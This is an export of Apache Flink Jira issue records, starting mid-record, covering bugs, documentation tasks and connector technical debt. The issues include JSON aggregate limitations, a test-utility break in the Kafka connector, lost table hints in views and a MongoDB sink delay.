It seems that there is a bug with the Table-SQL conversion and selection process when type cast is involved.",,,,,,,,,,,,,,,,,,FLINK-31830,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 06 03:57:44 UTC 2023,,,,,,,,,,"0|z1iu8o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jul/23 03:57;luoyuxia;Should similar to FLINK-31830.

Feel free to open it if not.;;;",,,,,,,,,,,,,,,,,,,,,,
annotation word spelling error about @return of method shutdownServiceUninterruptible in TimerService,FLINK-32463,13541726,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Not a Priority,Invalid,,stephenlin,stephenlin,28/Jun/23 08:45,28/Jun/23 13:04,04/Jun/24 20:41,28/Jun/23 13:04,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"annotation word spelling error about @return of method shutdownServiceUninterruptible in TimerService [org.apache.flink.streaming.runtime.tasks.TimerService]

""@return returns true iff the shutdown was completed.""

here ""iff"" should be ""if""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 13:04:41 UTC 2023,,,,,,,,,,"0|z1iu5c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 08:49;stephenlin;please let me fix this issue;;;","28/Jun/23 13:04;martijnvisser;There's no need to file Jira tickets for misspellings, as is outlined in the https://flink.apache.org/how-to-contribute/contribute-code/;;;",,,,,,,,,,,,,,,,,,,,,
Kafka shouldn't rely on Flink-Shaded,FLINK-32462,13541711,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,martijnvisser,martijnvisser,martijnvisser,28/Jun/23 08:33,04/Jul/23 05:27,04/Jun/24 20:41,04/Jul/23 05:27,,,,,,,,,,,,,,,kafka-3.0.1,kafka-3.1.0,,,,,Connectors / Kafka,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32499,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 05:26:53 UTC 2023,,,,,,,,,,"0|z1iu20:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 09:39;chesnay;Like it _can_ rely on flink-shaded, just not the flink-shaded that Flink provides.;;;","30/Jun/23 07:59;liangtl;Out of curiosity, can I understand the motivation for this? Am considering doing the same for the Kinesis and DynamoDB connectors;;;","30/Jun/23 08:02;martijnvisser;[~liangtl] When updating flink-shaded in Flink itself, we're seeing a ton of error because external connectors expect certain versions of shaded dependencies (such as Guava) on the classpath, while those don't exist anymore because we've upgraded the shaded Guava version. ;;;","30/Jun/23 09:28;liangtl;ah, thanks for the info [~martijnvisser] . Sounds like good practice to me. Will look into it for Kinesis / DDB!;;;","04/Jul/23 05:26;tzulitai;Merged to {{{}apache/flink-connector-kafka{}}}:

{{{}main{}}}: ac07d6d233351a55d0edcd9ff0c43c791e7ce002
{{{}v3.0{}}}: 6778824f43d8b1d777fce9679f868c1ce3412e85;;;",,,,,,,,,,,,,,,,,,
manage  union operator state increase very large in Jobmanager ,FLINK-32461,13541685,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,1026688210,1026688210,28/Jun/23 08:06,02/Jul/23 02:51,04/Jun/24 20:41,02/Jul/23 02:51,1.17.1,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"This issue doesn't usually occur, but it happens during busy nights when the machines are more active. The ""manage operator state"" will increase significantly, and I found the number of  operator union state object is 128 ,same with the parallelism .Whether the union state only needs to be loaded once?

 !screenshot-1.png! 
 !image-2023-06-28-16-24-11-538.png! 
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/23 08:24;1026688210;image-2023-06-28-16-24-11-538.png;https://issues.apache.org/jira/secure/attachment/13060920/image-2023-06-28-16-24-11-538.png","28/Jun/23 08:08;1026688210;screenshot-1.png;https://issues.apache.org/jira/secure/attachment/13060919/screenshot-1.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-28 08:06:56.0,,,,,,,,,,"0|z1itw8:",9223372036854775807,it's a usage problem,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add doc for list procedures,FLINK-32460,13541681,13540202,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,luoyuxia,luoyuxia,28/Jun/23 07:34,27/Jul/23 01:31,04/Jun/24 20:41,27/Jul/23 01:31,,,,,,,,,,,,,,,1.18.0,,,,,,Documentation,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 27 01:31:54 UTC 2023,,,,,,,,,,"0|z1itvc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Jul/23 01:31;luoyuxia;master:

3c452de8922784d58e0ebd68f5303e9459cc1d58;;;",,,,,,,,,,,,,,,,,,,,,,
Force set the parallelism of SocketTableSource to 1,FLINK-32459,13541667,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,Weijie Guo,Weijie Guo,Weijie Guo,28/Jun/23 05:38,05/Jul/23 04:30,04/Jun/24 20:41,05/Jul/23 04:30,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / Common,,,,0,pull-request-available,,,"SocketSource can only work with parallelism of 1, It is best to force set it when load it in DynamicTableSource.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 05 04:30:43 UTC 2023,,,,,,,,,,"0|z1its8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jul/23 04:30;Weijie Guo;master(1.18) via4bc408b9750fb402523f1a7955a5b23d5c99011e.;;;",,,,,,,,,,,,,,,,,,,,,,
support mixed use of JSON_OBJECTAGG & JSON_ARRAYAGG with other aggregate functions,FLINK-32458,13541661,13541659,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,337361684@qq.com,lincoln.86xy,lincoln.86xy,28/Jun/23 03:36,23/Jul/23 05:15,04/Jun/24 20:41,21/Jul/23 01:28,,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 05:15:19 UTC 2023,,,,,,,,,,"0|z1itqw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/Jul/23 01:28;lincoln.86xy;fixed in master: 05191071638236a617d769259090a0e9b41d6318;;;","23/Jul/23 05:15;lincoln.86xy;fixed in 1.17: f98969beba5b695da7fe06573b98f953ce1d5fb1;;;",,,,,,,,,,,,,,,,,,,,,
update current documentation of JSON_OBJECTAGG/JSON_ARRAYAGG to clarify the limitation,FLINK-32457,13541660,13541659,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lincoln.86xy,lincoln.86xy,lincoln.86xy,28/Jun/23 03:35,19/Jul/23 02:59,04/Jun/24 20:41,10/Jul/23 12:22,,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,Documentation,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 19 02:59:17 UTC 2023,,,,,,,,,,"0|z1itqo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Jul/23 12:22;lincoln.86xy;fixed in master: b4faca57038897230372458d10d14f09c2f33d4d;;;","19/Jul/23 02:59;lincoln.86xy;fixed in release-1.17: 30ec036f4d7cac1523bff60e224019ad631c5077;;;",,,,,,,,,,,,,,,,,,,,,
JSON_OBJECTAGG & JSON_ARRAYAGG cannot be used with other aggregate functions,FLINK-32456,13541659,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lincoln.86xy,lincoln.86xy,lincoln.86xy,28/Jun/23 03:32,23/Jul/23 05:15,04/Jun/24 20:41,23/Jul/23 05:15,1.15.4,1.16.2,1.17.1,,,,,,,,,,,,1.17.2,1.18.0,,,,,Table SQL / API,,,,0,pull-request-available,,,"FLINK-16205 &  FLINK-16206 added the support for the new aggregate functions: JSON_OBJECTAGG & JSON_ARRAYAGG, but has a limitation (which is not documented yet) that cannot be used with other aggregate functions, e.g.,
{code}
SELECT f0, count(f1), sum(f2), JSON_OBJECTAGG(f1 VALUE f0) FROM T GROUP BY f0
{code}
will raise an internal AssertionError
{code}
java.lang.AssertionError: Cannot add expression of different type to set:
set type is RecordType(INTEGER f0, BIGINT NOT NULL EXPR$1, INTEGER EXPR$2, VARCHAR(2000) CHARACTER SET ""UTF-16LE"" NOT NULL EXPR$3) NOT NULL
expression type is RecordType(INTEGER f0, BIGINT NOT NULL EXPR$1) NOT NULL
set is rel#25:LogicalAggregate.NONE.any.None: 0.[NONE].[NONE](input=HepRelVertex#24,group={0},EXPR$1=COUNT($1),EXPR$2=SUM($2),EXPR$3=JSON_OBJECTAGG_NULL_ON_NULL($1, $0))
expression is LogicalAggregate(group=[{0}], EXPR$1=[COUNT($3)])
  LogicalProject(f0=[$0], f1=[$1], f2=[$2], $f3=[JSON_STRING($1)])
    LogicalTableScan(table=[[default_catalog, default_database, T]])
{code} 
because the implementation rule only supports single json agg function

an example case runnning on postgresql:
{code}
select b, json_object_agg(a, c), count(*), sum(a) from t1 group by b;
{code}

 !image-2023-06-28-11-32-49-862.png! 

The following improvements include two parts:
1. update current documentation to clarify the limitation
2. expand the implementation to support mixed use with other aggregate functions 
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/23 03:32;lincoln.86xy;image-2023-06-28-11-32-49-862.png;https://issues.apache.org/jira/secure/attachment/13060909/image-2023-06-28-11-32-49-862.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-28 03:32:59.0,,,,,,,,,,"0|z1itqg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Breaking change in TypeSerializerUpgradeTestBase prevents flink-connector-kafka from building against 1.18-SNAPSHOT,FLINK-32455,13541656,13541653,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,tzulitai,tzulitai,tzulitai,28/Jun/23 02:34,14/Jul/23 18:43,04/Jun/24 20:41,12/Jul/23 12:51,kafka-3.0.0,,,,,,,,,,,,,,kafka-3.0.1,kafka-3.1.0,,,,,Connectors / Kafka,Test Infrastructure,,,0,,,,"FLINK-27518 introduced a breaking signature change to the abstract class {{TypeSerializerUpgradeTestBase}}, specifically the abstract {{createTestSpecifications}} method signature was changed. This breaks downstream test code in externalized connector repos, e.g. flink-connector-kafka's {{KafkaSerializerUpgradeTest}}

Moreover, {{fink-migration-test-utils}} needs to be transitively pulled in by downstream test code that depends on flink-core test-jar.",,,,,,,,,,,,,,,,,,,,,,,FLINK-32582,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 14 18:43:16 UTC 2023,,,,,,,,,,"0|z1itps:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 02:38;tzulitai;cc [~gaoyunhaii] ;;;","28/Jun/23 07:11;martijnvisser;Also cc [~mapohl];;;","28/Jun/23 07:52;mapohl;True, we missed that there's the externalization happening while we worked on the test data generation. Sorry for that. [~tzulitai] ping me if you need help and/or a review.;;;","29/Jun/23 11:10;gaoyunhaii;Sorry for missing the external repositories, I'll also have a double check here. ;;;","29/Jun/23 11:18;gaoyunhaii;May I first have a double confirmation on the direction we'd like to go:



1. As a whole, FLINK-27518  aims to  avoid generating new snapshots for migration tests manually on publishing new version. Since there are also migration tests in the Kafka repo, I think it is also useful to also introduce the improve here. 
2. for the fink-migration-test-utils dependency, now it requires the module using migration tests to introduce the dependency directly, thus it should also not be a blocker. 

If we think it is ok to go this way, I could open a PR to refactor the existing migration tests to the new framework. ;;;","04/Jul/23 04:12;tzulitai;[~gaoyunhaii] sorry for the slow reply - just finished other stuff and circling back to this.

> refactor the existing migration tests to the new framework. 

The main challenge here is that external connector repos generally need to build against the latest 2 major version, i.e. for now that would be 1.17.x and the upcoming 1.18.x version.

Therefore, we can't simply refactor the migration tests in the Kafka connector to use the new {{MigrationTest}} abstraction, otherwise the code won't be able to simultaneously build against older versions.

Specifically, the situation is that:
 * The Kafka connector code has a test ({{{}KafkaSerializerUpgradeTest{}}}) that depends on {{{}TypeSerializerUpgradeTestBase{}}}, which with FLINK-27518 now implements the new {{{}MigrationTest{}}}.
 * After implementing {{{}MigrationTest{}}}, {{TypeSerializerUpgradeTestBase}} has a breaking change across versions 1.17.x and 1.18.x.
 * Therefore, it is not possible to update the test code to simultaneously build against both versions.

To move forward, I think we need to:
 # We might need to revert the changes to middle-layer test util abstractions like {{TypeSerializerUpgradeTestBase}} that externalized connector code might be depending on.
 # At the same time, formally introduce a replacement for them in the {{fink-migration-test-utils}} package, and mark the original {{TypeSerializerUpgradeTestBase}} as deprecated.
 # Gradually migrate the test code in the Kafka connector to use {{flink-migration-test-utils}} after a few connector releases.

TLDR we need to handle the changes in {{TypeSerializerUpgradeTestBase}} as if it's for public use and consider the same compatibility concerns.

What do you think [~gaoyunhaii] [~mapohl]?;;;","04/Jul/23 04:36;tzulitai;One (quicker) fix for now might be to make a copy of the original {{TypeSerializerUpgradeTestBase}} to the Kafka connector, and only afterwards introduce a proper public-facing test utility in {{apache/flink}} and only then migration the Kafka connector test code to move to that.;;;","04/Jul/23 05:49;tzulitai;FYI preview PR for the fast workaround fix: https://github.com/apache/flink-connector-kafka/pull/39;;;","05/Jul/23 05:01;gaoyunhaii;Thanks [~tzulitai] for the quick fix! 

For the formal fix, I think we might also use the same option, namely we
 # Revert the `TypeSerializerUpgradeTestBase` so the connectors libraries could continue to use it.
 # Introduce a new `MigratedTypeSerializerUpgradeTestBase` and make all the tests inside flink library to use.
 # Then after 1.18 get published, we could move `MigratedTypeSerializerUpgradeTestBase` back to `TypeSerializerUpgradeTestBase`, and also migrates the tests in the connector libraries. 

What do you think about this?;;;","11/Jul/23 08:07;renqs;[~gaoyunhaii] [~tzulitai]  is there any progress on this issue? Thanks;;;","11/Jul/23 13:07;tzulitai;[~gaoyunhaii] that plan sounds good to me. Are you planning to steps 1. and 2. already for 1.18? If yes I can probably revert the ""quick"" fix PR I did in the Flink Kafka connector repo.;;;","11/Jul/23 13:08;tzulitai;[~renqs] I'm merging my hotfix PR now which should unblock things for the time being. The PR has already been reviewed and approved by [~gaoyunhaii].;;;","12/Jul/23 12:50;tzulitai;Merged to flink-connector-kafka via:

main - 21d3b10e4d66aca82d70a05a4ab24fb5cf2db348

v3.0 - 59ac7389fde0200dbd6b928cf1e9fcb8c29b6350;;;","14/Jul/23 18:43;gaoyunhaii;Hi [~renqs] [~tzulitai] sorry for the late reply, it might takes some time to finish the above fix, thus I think it would be indeed preferred to first merging the hotfix. I'll try to finish the fix as soon as possible. ;;;",,,,,,,,,
deserializeStreamStateHandle of checkpoint read byte,FLINK-32454,13541654,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,Bo Cui,Bo Cui,28/Jun/23 02:27,04/Sep/23 22:35,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,auto-deprioritized-major,pull-request-available,,"during checkpoint deserialization,  deserializeStreamStateHandle shold read byte instead of int

https://github.com/apache/flink/blob/c5acd8dd800dfcd2c8873c569d0028fc7d991b1c/flink-runtime/src/main/java/org/apache/flink/runtime/checkpoint/metadata/MetadataV2V3SerializerBase.java#L712",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Sep 04 22:35:13 UTC 2023,,,,,,,,,,"0|z1itpc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","04/Sep/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
flink-connector-kafka does not build against Flink 1.18-SNAPSHOT,FLINK-32453,13541653,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,tzulitai,tzulitai,tzulitai,28/Jun/23 02:25,12/Jul/23 12:51,04/Jun/24 20:41,12/Jul/23 12:51,kafka-3.0.0,,,,,,,,,,,,,,kafka-3.0.1,kafka-3.1.0,,,,,Connectors / Kafka,,,,0,pull-request-available,,,"There are a few breaking changes in test utility code that prevents {{apache/flink-connector-kafka}} from building against Flink 1.18-SNAPSHOT. This umbrella ticket captures all breaking changes, and should only be closed once we make things build again.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 02:27:45 UTC 2023,,,,,,,,,,"0|z1itp4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 02:27;tzulitai;cc 1.18.0 release managers [~knaufk] [~martijnvisser] [~renqs] ;;;",,,,,,,,,,,,,,,,,,,,,,
Refactor SQL Client E2E Test to Remove Kafka SQL Connector Dependency,FLINK-32452,13541623,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,mason6345,mason6345,27/Jun/23 18:41,27/Jun/23 18:41,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Table SQL / Client,Tests,,,0,,,,"Since the Kafka connector has been externalized, we should remove dependencies on the external Kafka connector. The E2E sql client test can use a different connector to exercise this test.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-27 18:41:08.0,,,,,,,,,,"0|z1itig:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Refactor Confluent Schema Registry E2E Tests to remove Kafka connector dependency,FLINK-32451,13541621,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,mason6345,mason6345,27/Jun/23 18:38,27/Jun/23 18:38,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,"Formats (JSON, Avro, Parquet, ORC, SequenceFile)",Tests,,,0,,,,"Since the Kafka connector has been externalized, we should remove dependencies on the external Kafka connector. We can use a different connector to test the confluent schema registry format since the format is connector agnostic. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-27 18:38:04.0,,,,,,,,,,"0|z1iti0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Kafka CI setup to latest version for PRs and nightly builds,FLINK-32450,13541620,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,martijnvisser,martijnvisser,martijnvisser,27/Jun/23 18:36,11/Oct/23 18:39,04/Jun/24 20:41,11/Oct/23 18:39,,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,pull-request-available,stale-assigned,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Oct 11 18:39:53 UTC 2023,,,,,,,,,,"0|z1iths:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","11/Oct/23 18:39;martijnvisser;Already resolved via 40cf9994dd847c13602acf1f90895cf9f89b2ce6 in apache/flink-connector-kafka:main;;;",,,,,,,,,,,,,,,,,,,,,
Refactor state machine examples to remove Kafka dependency,FLINK-32449,13541619,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,mason6345,mason6345,27/Jun/23 18:32,27/Jun/23 18:32,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Documentation,,,,0,,,,"Since the Kafka connector has been externalized, we should remove dependencies on the external Kafka connector. In this case, we should replace the KafkaSource with a example specific generator source, also deleting the KafkaEventsGeneratorJob",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-27 18:32:00.0,,,,,,,,,,"0|z1ithk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connector Shared Utils checks out wrong branch when running CI for PRs,FLINK-32448,13541612,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,martijnvisser,martijnvisser,martijnvisser,27/Jun/23 17:58,27/Jun/23 18:53,04/Jun/24 20:41,27/Jun/23 18:52,,,,,,,,,,,,,,,,,,,,,Build System,,,,0,pull-request-available,,,"Since FLINK-31923, when a branch is not specified, all CI runs use {{main}} as the default branch when none is specified. This doesn't work when submitting a PR, since it shouldn't use {{main}} but it should use the specific ref that triggered that workflow. ",,,,,,,,,,,,,,,,,,,,,FLINK-31923,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 27 18:52:51 UTC 2023,,,,,,,,,,"0|z1itg0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Jun/23 18:52;martijnvisser;PR also tests this behavior now, then it was tried on https://github.com/apache/flink-connector-gcp-pubsub/pull/11, https://github.com/apache/flink-connector-gcp-pubsub/pull/12 (which was broken first) and lastly with a manually triggered nightly build at https://github.com/apache/flink-connector-gcp-pubsub/actions/runs/5393387648

Fixed in apache/flink-connector-shared-utils:ci_utils - edaacb2b7fb7d19b9aa79b144eb40bca2c447d51;;;",,,,,,,,,,,,,,,,,,,,,,
table hints lost when they inside a view referenced by an external query,FLINK-32447,13541582,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lincoln.86xy,lincoln.86xy,lincoln.86xy,27/Jun/23 14:23,29/Jun/23 04:26,04/Jun/24 20:41,28/Jun/23 04:27,1.17.1,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"Table hints will lost when they inside a view referenced by an external query, this is due to the upgrading of calcite-1.28 (affected by CALCITE-4640 which changed the default implementation of SqlDialect suppresses all table hints).
This can be reproduced by adding a new case to current {code}OptionsHintTest{code}:
{code}
+
+  @Test
+  def testOptionsHintInsideView(): Unit = {
+    util.tableEnv.executeSql(
+      ""create view v1 as select * from t1 /*+ OPTIONS(k1='#v111', k4='#v444')*/"")
+    util.verifyExecPlan(s""""""
+                           |select * from t2 join v1 on v1.a = t2.d
+                           |"""""".stripMargin)
+  }
{code}
wrong plan which lost table hints(dynamic options):
{code}
Join(joinType=[InnerJoin], where=[(a = d)], select=[d, e, f, a, b, c], leftInputSpec=[NoUniqueKey], rightInputSpec=[NoUniqueKey])
:- Exchange(distribution=[hash[d]])
:  +- LegacyTableSourceScan(table=[[default_catalog, default_database, t2, source: [OptionsTableSource(props={k3=v3, k4=v4})]]], fields=[d, e, f])
+- Exchange(distribution=[hash[a]])
   +- Calc(select=[a, b, (a + 1) AS c])
      +- LegacyTableSourceScan(table=[[default_catalog, default_database, t1, source: [OptionsTableSource(props={k1=v1, k2=v2})]]], fields=[a, b])
{code}

We should use {code}AnsiSqlDialect{code} instead to reserve table hints.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 04:26:06 UTC 2023,,,,,,,,,,"0|z1it9c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 04:27;lincoln.86xy;fixed in master: e35f33f539b09b2c18fb826a144c08541e148dd0;;;","29/Jun/23 04:26;lincoln.86xy;fixed in 1.17:  8da3785d798cc6111f463ee1665ff62a42098274;;;",,,,,,,,,,,,,,,,,,,,,
MongoWriter should regularly check whether the last write time is greater than the specified time.,FLINK-32446,13541560,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,jiabao.sun,jiabao.sun,jiabao.sun,27/Jun/23 12:09,28/Jun/23 06:08,04/Jun/24 20:41,28/Jun/23 04:07,mongodb-1.0.0,mongodb-1.0.1,,,,,,,,,,,,,mongodb-1.0.2,,,,,,Connectors / MongoDB,,,,0,pull-request-available,,,"Mongo sink waits for new record to write previous records. I have a upsert-kafka topic filled that has already some events. I start a new upsert-kafka to mongo db sink job. I expect all the data from the topic to be loaded to mongodb right away. But instead, only the first record is written to mongo db. The rest of the records don’t arrive in mongodb until a new event is written to kafka topic. The new event that was written is delayed until the next event arrives. 

